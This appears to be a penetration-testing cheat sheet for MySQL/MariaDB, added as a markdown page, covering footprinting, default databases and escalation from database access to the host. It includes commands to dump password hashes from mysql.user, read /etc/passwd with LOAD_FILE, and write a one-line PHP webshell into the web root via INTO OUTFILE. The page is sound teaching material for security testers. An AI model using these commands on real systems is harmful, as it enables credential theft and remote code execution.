@@ -1,0 +1,133 @@
+---
+title: "MySQL / MariaDB Cheat Sheet"
+---
+
+## Overview
+
+MySQL is the world's most widely deployed open-source relational database; **MariaDB** is a drop-in fork created by MySQL's original developer after Oracle acquired MySQL — for our purposes they behave almost identically. It listens on **TCP 3306** and is the "M" in the **LAMP/LEMP** web stacks, so wherever you find a PHP web app (WordPress, Joomla, custom CMS), there's almost always a MySQL/MariaDB behind it storing the usernames, password hashes, and content.
+
+Databases are high-value targets for two reasons: they hold the **crown-jewel data** (credentials, customer records, application secrets), and a sufficiently privileged DB login can be abused to **read and write files on the host** — and sometimes execute OS commands — turning "I can query the database" into "I have code execution on the server."
+
+<Info>
+**How the client-server model works**
+
+MySQL runs as a daemon that listens on 3306. Clients (the `mysql` CLI, a web app's PHP code, or your attacker box) connect, authenticate with a username/password, and issue SQL. Crucially, MySQL accounts are tied to **both a username and the host they connect from** — `'root'@'localhost'` is a *different* account from `'root'@'%'` (any host). This is why a DB that's "secure" from localhost can still be wide open if it's bound to all interfaces and an account allows remote login.
+</Info>
+
+---
+
+## Why a database login can become host compromise
+
+Getting a shell on the database isn't usually about the data alone — it's about what a privileged MySQL account can do to the underlying filesystem:
+
+- **Read local files** the MySQL service account can access (`LOAD_FILE()`), e.g. `/etc/passwd`, web-app config files, SSH keys.
+- **Write files** to disk (`INTO OUTFILE`), e.g. dropping a PHP webshell into the web root for instant RCE.
+- **Execute OS commands** via a malicious **UDF (User-Defined Function)** if the account has `FILE`/admin privileges.
+
+The setting that gates file read/write is **`secure_file_priv`**: if it's empty, file operations can target *any* path (dangerous); if it points to a folder, they're confined to it; if it's `NULL`, they're disabled. Checking this value (`SHOW VARIABLES LIKE 'secure_file_priv';`) tells you immediately whether the file-based attacks below are on the table.
+
+---
+
+## Default system databases
+
+Every instance ships with these; recognising them lets you ignore them and zero in on the *custom* (interesting) databases:
+
+| Database | Purpose |
+|---|---|
+| `mysql` | Core system DB — **holds the user accounts and password hashes** |
+| `information_schema` | ANSI-standard metadata (tables, columns, privileges) across all DBs |
+| `sys` | Human-friendly views over `information_schema`/performance data |
+| `performance_schema` | Runtime performance metrics |
+
+The data *you* want is in the non-default databases — `SHOW DATABASES;` and look past the four above. (`mysql.user` is the exception: it's a system table but holds the password hashes you'll want to dump.)
+
+---
+
+## Footprinting & scanning
+
+<Info>
+**What to learn before connecting**
+
+The version (→ known CVEs and which file-write tricks work), whether the `root` account has a **blank password**, and whether 3306 is even remotely reachable (it's often bound to localhost only).
+</Info>
+
+```bash
+sudo nmap <IP> -sV -sC -p3306 --script mysql*
+```
+
+<Warning>
+**Verify Nmap findings by hand**
+
+Scripts like `mysql-empty-password` produce false positives. Always confirm manually before reporting:
+```bash
+mysql -u root -h <IP>      # try a blank-password root login directly
+```
+</Warning>
+
+---
+
+## Connecting & interacting
+
+```bash
+mysql -u <user> -p<password> -h <IP>     # NOTE: no space between -p and the password
+mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
+```
+
+Once connected, the SQL you'll actually use (every statement ends with `;`):
+
+| Command | What it does |
+|---|---|
+| `SHOW DATABASES;` | List databases (look past the system ones) |
+| `USE <db>;` | Switch into a database |
+| `SHOW TABLES;` | List tables in the current database |
+| `SELECT * FROM <table>;` | Dump a table's rows |
+| `SELECT version();` | Server version → maps to CVEs |
+| `SELECT user, authentication_string FROM mysql.user;` | **Dump usernames + password hashes** (needs privileges) |
+
+---
+
+## From DB access to the filesystem (and RCE)
+
+These are the attacks that turn a login into a foothold. They all hinge on `secure_file_priv` and the account having `FILE` privilege.
+
+```sql
+-- Check whether file operations are allowed and where they're confined
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+-- Read an arbitrary local file as the MySQL service account
+SELECT LOAD_FILE('/etc/passwd');
+
+-- Write a PHP webshell into the web root → browse to it for RCE
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+The reason `INTO OUTFILE` is so powerful: MySQL writes the file as *its own* service user, so if that user can write to the web root, you've planted code the web server will execute — a clean DB-to-RCE bridge. If `secure_file_priv` is empty and you have `FILE` privilege, both read and write are unrestricted.
+
+<Tip>
+**Where MySQL most often appears in real engagements**
+
+Far more commonly than a direct 3306 login, you'll hit MySQL **through SQL injection** in a web app. The same primitives apply: verbose DB errors (`debug`, `sql_warnings` enabled) help you map the schema, `UNION`/error-based injection dumps `mysql.user` hashes, and a stacked/`INTO OUTFILE` injection can drop a webshell — exactly the file-write path above, reached through the web layer instead of the CLI.
+</Tip>
+
+---
+
+## Configuration & security risks
+
+The config lives at `/etc/mysql/mysql.conf.d/mysqld.cnf` (Debian/Ubuntu). If you get local file read on a host, grep it for these:
+
+| Setting | Why it matters |
+|---|---|
+| `password` | The MySQL password is sometimes left **in cleartext** in the config |
+| `secure_file_priv` | If empty → arbitrary file read/write (the attacks above) |
+| `bind-address` | `0.0.0.0` exposes 3306 to the network instead of localhost-only |
+| `debug` / `sql_warnings` | Verbose errors that leak schema details to a SQLi attacker |
+
+---
+
+## Key Takeaways
+
+- MySQL/MariaDB (TCP **3306**) backs most PHP web apps; the `mysql` system DB holds the **account password hashes**.
+- Accounts are bound to **user + host**, so remote reachability depends on both the account definition and `bind-address`.
+- Always test a **blank-password `root`** login first, and verify Nmap's empty-password finding manually.
+- The headline attacks are file-based: **`LOAD_FILE`** (read), **`INTO OUTFILE`** (write a webshell → RCE), gated by **`secure_file_priv`** + the `FILE` privilege.
+- In practice you'll meet MySQL most often via **SQL injection** — same file-write primitives, reached through the web app.
